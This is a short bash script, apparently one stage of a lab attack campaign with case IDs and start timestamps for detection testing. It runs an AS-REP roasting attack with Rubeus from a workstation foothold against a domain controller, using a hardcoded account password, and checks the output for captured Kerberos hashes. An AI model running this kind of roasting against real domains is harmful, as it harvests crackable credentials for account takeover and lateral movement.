#!/usr/bin/env bash
# T003 — AS-REP roast from ws01 beachhead (child\analyst_t1) → dc02
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"
CASE_ID="CADRE-T003-ASREP-$(date -u +%Y%m%d)"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T003 AS-REP | CASE=${CASE_ID} | T0=${T0} ==="
echo "Path: provisioning → ws01 (analyst_t1 WinRM) → dc02"

ws01_ensure_rubeus
OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t003-asrep.ps1)"
printf '%s\n' "${OUT}"
if ! printf '%s' "${OUT}" | grep -qE '\$krb5asrep\$|Got TGT|AS-REQ w/o preauth successful'; then
  echo "T003_FAIL: no AS-REP roast proof in Rubeus output" >&2
  exit 1
fi
echo "T003_OK"

echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "${CASE_ID}" > /tmp/cadre-last-case-id.txt
echo "=== T003 run complete ==="
